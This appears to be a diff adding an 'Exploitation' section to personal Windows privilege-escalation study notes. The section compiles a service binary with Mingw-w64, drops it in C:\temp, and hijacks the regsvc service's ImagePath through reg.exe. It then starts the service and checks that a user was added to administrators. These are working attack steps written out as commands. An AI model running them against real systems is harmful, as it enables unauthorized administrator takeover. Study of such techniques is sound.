@@ -181,6 +181,36 @@ Using AccessChk (Sysinternals)
 
 > .\accesschk64.exe -kvusw hklm\system\currentcontrolset\services
 
+#### Exploitation
+
+Source: https://www.hackingtutorials.org/exploit-tutorials/mingw-w64-how-to-compile-windows-exploits-on-kali-linux/
+
+Installing Mingw-w64 on Kali Linux
+
+> apt-get update
+
+> apt-get install mingw-w64
+
+Compile
+
+> x86_64-w64-mingw32-gcc windows_service.c -o x.exe
+
+Transfer file for target machine <<<<
+
+Copy file for dir TEMP
+
+> reg.exe add hklm\system\currentcontrolset\services\regsvc /v imagepath /t reg_expand_sz /d c:\temp\x.exe /f
+
+Start service
+
+> sc.exe start regsvc
+
+Check now the user added in administrators groups
+
+> net user user
+
+
+
 
 ----------------------------------------------------------------------------------------------------------------------------------------
 02 - https://www.youtube.com/watch?v=9s8jYwx9FSA&list=PLjG9EfEtwbvIrGFTx4XctK8IxkUJkAEqP&index=4&t=0s
